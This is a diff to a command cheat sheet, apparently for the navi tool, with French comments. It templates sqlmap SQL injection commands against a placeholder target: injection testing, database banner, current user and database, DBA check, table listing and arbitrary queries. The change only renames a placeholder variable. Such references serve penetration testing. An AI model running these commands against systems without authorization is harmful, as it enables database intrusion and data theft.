@@ -1,24 +1,24 @@
 % sqlmap, web, database, injection
 
 # Test de vulnérabilité
-run <TYPE> sqlmap -u http://<TARGET>/?<NAME_PARAM>=<VALUE_PARAM>
+run <ACTION_CMD> sqlmap -u http://<TARGET>/?<NAME_PARAM>=<VALUE_PARAM>
 
 # Version de la base de donnée
-run <TYPE> sqlmap -u <URL> --banner
+run <ACTION_CMD> sqlmap -u <URL> --banner
 
 # Utilisateur courant
-run <TYPE> sqlmap -u <URL> --current-user
+run <ACTION_CMD> sqlmap -u <URL> --current-user
 
 # Base de donnée courante
-run <TYPE> sqlmap -u <URL> --current-db
+run <ACTION_CMD> sqlmap -u <URL> --current-db
 
 # Privilège utilisateur courant
-run <TYPE> sqlmap -u <URL> --is-dba
+run <ACTION_CMD> sqlmap -u <URL> --is-dba
 
 # Tables courantes sans les bases systèmes
-run <TYPE> sqlmap -u <URL> --tables --exclude-sys
+run <ACTION_CMD> sqlmap -u <URL> --tables --exclude-sys
 
 # Query
-run <TYPE> sqlmap -u <URL> --sql-query "<QUERY>"
+run <ACTION_CMD> sqlmap -u <URL> --sql-query "<QUERY>"
 
-$ TYPE: echo "all,copy,view,exec" | tr ',' '\n'
+$ ACTION_CMD: echo "exec,view" | tr ',' '\n'
